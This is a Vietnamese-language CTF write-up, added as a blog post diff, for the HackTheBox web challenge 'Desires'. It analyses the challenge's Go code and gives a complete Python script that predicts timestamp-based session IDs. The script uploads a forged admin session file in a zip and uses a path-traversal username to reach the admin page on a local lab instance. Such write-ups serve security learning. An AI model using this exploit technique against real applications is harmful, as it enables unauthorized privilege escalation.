@@ -1,0 +1,249 @@
+---
+title: Desires HTB
+date: 2025-08-16
+tags: [ctf, web, htb-challenges]
+categories: [Writeups, HTB-Challenges]
+author: bumbi.203_
+---
+
+# Desires 
+
+## Giao diện web
+
+### Phần login
+
+![image](/assets/img/HTB/challenges/web/Desires/image1.png)
+
+### Phần Register 
+
+![image](/assets/img/HTB/challenges/web/Desires/image2.png)
+
+Sau khi register và login vào thành công: 
+
+![image](/assets/img/HTB/challenges/web/Desires/image3.png)
+
+## Review Source Code 
+
+![image](/assets/img/HTB/challenges/web/Desires/image4.png)
+
+Tìm thấy được các endpoint như trên. 
+
+Thấy có `/admin` như vậy thì mình phải tìm cách để leo quyền lên admin. 
+
+Tìm thấy có 1 file `http.go` 
+
+![image](/assets/img/HTB/challenges/web/Desires/image5.png)
+
+Từ đây thấy có nó xác định role cho user. 
+
+Đến với phần upload cũng là chức năng duy nhất của challenges/web này. 
+
+![image](/assets/img/HTB/challenges/web/Desires/image6.png)
+
+Ở đây, có vẻ nó có chức năng giải nén khi upload 1 file nén. 
+
+Và filename đã được dùng `uuid` thành 1 chuỗi khó đọc. Sau đó cộng với extension của tên file. 
+
+Và khi upload thành công thì nó sẽ tạo ra 1 folder tên là `files` nối với `username` của user đó. Rồi chứa file đã nén. 
+
+Kiểm tra bên trong docker thì nó như sau: 
+
+![image](/assets/img/HTB/challenges/web/Desires/image7.png)
+
+Mình tiếp tục lục lọi tiếp trong file `http.go`
+
+![image](/assets/img/HTB/challenges/web/Desires/image8.png)
+
+Mình thấy có 1 file Xác thực ở giữa Session. Ở đây nó dựa vào 2 trường là `sessioID` và `username`. 
+
+![image](/assets/img/HTB/challenges/web/Desires/image9.png)
+
+Quay lại ở trên thì tìm thấy 1 hàm `LoginHandler` 
+
+![image](/assets/img/HTB/challenges/web/Desires/image10.png)
+
+Và minh tìm thấy 1 file nữa là `sessions.go` 
+
+![image](/assets/img/HTB/challenges/web/Desires/image11.png)
+
+Trong file này có phần tạo session và folder để thực hiện điều này là `/tmp/sessiosns/` nối với `username`, trong đó có chứa 1 file session nhưng đã bị thay đổi. 
+
+![image](/assets/img/HTB/challenges/web/Desires/image12.png)
+
+File này chỉ rõ tên user và cả role của nó.
+
+![image](/assets/img/HTB/challenges/web/Desires/image13.png)
+
+Tiếp theo, có hàm `GetSession` có chức năng `ReadFile` nó đọc từ file session dựa vào folder `/tmp/sessions/username/sessionID` 
+
+Mà `sessionID` được tạo ra từ đây.
+```go=
+sessionID := fmt.Sprintf("%x", sha256.Sum256([]byte(strconv.FormatInt(time.Now().Unix(), 10))))
+``` 
+Dòng này cho biết là nó tạo session dựa vào thời gian theo từng giây. 
+
+Như vậy, nếu mình tạo ra 1 session trong quá khứ sau đó upload các file session có role admin thì đã có thể vào endpoint `/admin`. 
+
+![image](/assets/img/HTB/challenges/web/Desires/image14.png)
+
+Mình viết một script để tạo ra 10 `session_id` khác nhau, với thời gian được lùi dần từ 0 đến 9 giây so với thời điểm hiện tại (Unix timestamp).
+
+![image](/assets/img/HTB/challenges/web/Desires/image15.png)
+
+Trong mỗi file sẽ chứa là: 
+
+![image](/assets/img/HTB/challenges/web/Desires/image16.png)
+
+Nhưng nhận thấy rằng mình khai thác theo kiểu lùi ngược lại thì sẽ rất khó thành công. 
+
+Cho nên mình sẽ khai thác theo kiểu đoán trước tương lại nhennn. Mình vẫn có thể thực hiện thủ công nhưng mình sẽ nhờ python để làm điều này. 
+
+```python
+import hashlib
+import json 
+import os 
+import re 
+import time 
+import zipfile
+from datetime import datetime, timedelta 
+import requests 
+
+# ======================= CONFIG ==================== 
+BASE_URL = "http://localhost:1337"
+USERNAME = "abc"
+PASSWORD = "abc"
+EXPLOIT_USERNAME = f"../../../../../app/service/files/{USERNAME}"
+# ==================================================== 
+
+s = requests.Session() 
+
+def predict_session_ids(target_time):
+   ts = int(target_time.timestamp())
+   return hashlib.sha256(str(ts).encode()).hexdigest()
+
+def create_fake_session_files(session_id, output_dir="./exploit"):
+    os.makedirs(output_dir, exist_ok=True)
+    content = {"username":"test","id":1,"role":"admin"}
+    path = os.path.join(output_dir, session_id)
+    with open(path, "w") as f:
+        json.dump(content, f)
+    return path 
+
+def create_zip(file_path, zip_path="./exploit/exploit.zip"):
+    with zipfile.ZipFile(zip_path, "w") as zipf: 
+        zipf.write(file_path, os.path.basename(file_path))
+    return zip_path 
+
+def register_account(username, password):
+    return requests.post(f"{BASE_URL}/register", json={"username":username, "password":password})
+
+def login(username, password):
+    return requests.post(f"{BASE_URL}/login", json={"username":username, "password":password}, allow_redirects=False)
+
+def upload_zip(cookies, zip_path):
+    with open(zip_path, "rb") as f:
+        files = {"archive": ("payload.zip", f, "application/zip")}
+        return requests.post(f"{BASE_URL}/user/upload", files=files, cookies=cookies)
+
+def trigger_session_storage(target_time):
+    wait_s = (target_time - datetime.now()).total_seconds()
+    if wait_s > 0:
+        print(f"✅ Waiting {wait_s:.2f}s until {target_time} ...")
+        time.sleep(wait_s)
+    data = {"username": EXPLOIT_USERNAME, "password":"x"}
+    return requests.post(f"{BASE_URL}/login", json=data)
+
+def access_admin_page(username, password):
+    print(f"✨ Logging in with regular account: {username}")
+    login_data = {
+        "username": username,
+        "password": password
+    }
+    login_response = requests.post(f"{BASE_URL}/login", json=login_data, allow_redirects=False)
+    if login_response.status_code != 302:
+        print(f"❌ Login failed with status code: {login_response.status_code}")
+        return 
+    cookies = login_response.cookies
+    session_cookie = cookies.get('session')
+    username_cookie = cookies.get('username')
+    
+    print(f"✅ Successfully logged in - Session: {session_cookie}, Username: {username_cookie}")
+    
+    cookies_dict = {
+        "session": session_cookie,
+        "username": EXPLOIT_USERNAME
+    }
+    print(f"✨ Modified cookies: {cookies_dict}")
+    print(f"✨ Refreshing session with modified cookies....")
+    refresh_url = f"{BASE_URL}/user/upload"
+    refresh_response = requests.get(refresh_url, cookies=cookies_dict)
+    
+    print(f"✨ Accessing admin page....")
+    admin_url = f"{BASE_URL}/user/admin"
+    admin_response = requests.get(admin_url, cookies=cookies_dict)
+    
+    print(f"✨ Admin page response status: {admin_response.status_code}")
+    
+    if "HTB" in admin_response.text:
+        print(f"✅ Successfully accessed admin page!")
+        import re 
+        flag_match = re.search(r"HTB\{[^}]+\}", admin_response.text)
+        if flag_match: 
+            flag = flag_match.group(0)
+            print(f"✅ Flag: {flag}")
+        else:
+            print("✨ Flag format detected but couln't extract exact pattern")
+            return True
+    else:
+        print(f"❌ No Flag found in response")
+        return False
+    
+
+
+def main():
+    print("🧪 Preparing exploit...")
+    
+    # 1) Chọn thời điểm target (phút kế tiếp, giây = 0)
+    now = datetime.now()
+    target_time = (now + timedelta(minutes=1)).replace(second=0, microsecond=0)
+    print("✨ Target time: ", target_time)
+
+    # 2) Dự đoán sessionID
+    sid = predict_session_ids(target_time)
+    print("✨ Predicted sessionID: ", sid)
+    
+    # 3) tạo file session giả 
+    fpath = create_fake_session_files(sid)
+    zpath = create_zip(fpath)
+
+    # 4) đăng ký + login aacount thật 
+    register_account(USERNAME, PASSWORD)
+    r = login(USERNAME, PASSWORD)
+    if r.status_code != 302: 
+        print("❌ Login failed")
+        return 
+    cookies = r.cookies
+    
+    # 5) upload payload zip 
+    ur = upload_zip(cookies, zpath)
+    print(f"✨ Upload status:", ur.status_code)
+    
+    # 6) chờ tới đúng thời điểm -> trigger session storage 
+    trigger_session_storage(target_time)
+    
+    time.sleep(2)
+
+    # 7) Truy cập admin page 
+    access_admin_page(USERNAME, PASSWORD)
+    
+    
+if __name__ == "__main__":
+    main()
+
+```
+![image](/assets/img/HTB/challenges/web/Desires/image17.png)
+
+Như vậy mình đã extract Flag thành công!! 
+
+![image](/assets/img/HTB/challenges/web/Desires/image18.png)
+
